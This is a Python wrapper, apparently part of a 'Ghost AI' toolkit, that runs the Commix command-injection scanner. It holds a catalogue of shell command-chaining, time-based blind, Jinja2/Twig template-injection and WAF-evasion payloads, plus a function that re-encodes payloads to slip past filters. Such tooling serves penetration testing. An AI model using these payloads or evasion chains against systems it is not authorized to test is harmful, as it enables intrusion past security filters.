#!/usr/bin/env python3
"""
Ghost AI — Commix Bridge
Armageddon AI code generator + Bypass Supreme injection module.
Authorized penetration testing ONLY.
NO wallet integration.
"""
from __future__ import annotations
import json
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional


@dataclass
class CommixResult:
    target_url: str
    parameter: str
    technique: str
    injectable: bool
    payload: str
    os_info: Optional[str] = None
    hostname: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self) -> dict:
        return {
            "target": self.target_url,
            "parameter": self.parameter,
            "technique": self.technique,
            "injectable": self.injectable,
            "payload_snippet": self.payload[:30] + "..." if len(self.payload) > 30 else self.payload,
            "os_info": self.os_info,
            "hostname": self.hostname,
            "timestamp": self.timestamp,
        }


# ─── Bypass Supreme: injection technique catalog ────────────────────────────

BYPASS_TECHNIQUES = {
    "classic": {
        "name": "Classic OS Injection",
        "description": "Semicolon/pipe/backtick chaining",
        "payloads": ["; id", "| id", "` id`", "&& id"],
        "bypass": "None required",
    },
    "time_based": {
        "name": "Time-Based Blind",
        "description": "Sleep/ping delay measurement",
        "payloads": ["; sleep 5 #", "| ping -c 5 127.0.0.1"],
        "bypass": "WAF evasion via encoding",
    },
    "ssti_jinja2": {
        "name": "SSTI Jinja2",
        "description": "Server-side template injection",
        "payloads": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
        "bypass": "Unicode + case variation",
    },
    "ssti_twig": {
        "name": "SSTI Twig",
        "description": "PHP Twig template injection",
        "payloads": ["{{7*7}}", "{{dump(app)}}"],
        "bypass": "Whitespace normalization",
    },
    "waf_bypass_encoding": {
        "name": "WAF Bypass — Encoding Chain",
        "description": "Double URL + HTML entity + unicode encoding",
        "payloads": ["%3B%20id", "&#x3B;&#x20;id", "%u003B%u0020id"],
        "bypass": "Multi-layer encoding",
    },
    "filter_evasion_comments": {
        "name": "Filter Evasion — Comments",
        "description": "Insert SQL/shell comments to break pattern matching",
        "payloads": [";/**/id", ";%09id", ";%0aid"],
        "bypass": "Comment injection",
    },
}


class CommixBridge:
    """Ghost AI bridge to Commix OS injection scanner."""

    def __init__(self, commix_path: str = "commix") -> None:
        self.bin = commix_path

    def scan(
        self,
        url: str,
        data: Optional[str] = None,
        technique: str = "--all",
        extra_args: Optional[list[str]] = None,
    ) -> str:
        """Run commix and return raw output."""
        cmd = [self.bin, "--url", url, technique, "--batch"]
        if data:
            cmd += ["--data", data]
        if extra_args:
            cmd += extra_args
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return proc.stdout + proc.stderr
        except FileNotFoundError:
            return "commix not found — install from github.com/commixproject/commix"
        except subprocess.TimeoutExpired:
            return "scan timed out"

    def list_techniques(self) -> list[dict]:
        return [
            {
                "id": k,
                "name": v["name"],
                "description": v["description"],
                "bypass": v["bypass"],
                "payload_count": len(v["payloads"]),
            }
            for k, v in BYPASS_TECHNIQUES.items()
        ]

    def get_technique(self, technique_id: str) -> Optional[dict]:
        return BYPASS_TECHNIQUES.get(technique_id)

    def generate_bypass_chain(self, payload: str, bypass_types: list[str]) -> list[str]:
        """Apply a chain of bypass transformations to a payload."""
        variants = [payload]
        if "url_encode" in bypass_types:
            from urllib.parse import quote
            variants.append(quote(payload))
        if "double_url_encode" in bypass_types:
            from urllib.parse import quote
            variants.append(quote(quote(payload)))
        if "comment_insert" in bypass_types:
            variants.append(payload.replace(" ", "/**/"))
        if "case_variation" in bypass_types:
            variants.append(payload.upper())
            variants.append(payload.lower())
        return variants


if __name__ == "__main__":
    bridge = CommixBridge()
    print(json.dumps(bridge.list_techniques(), indent=2))
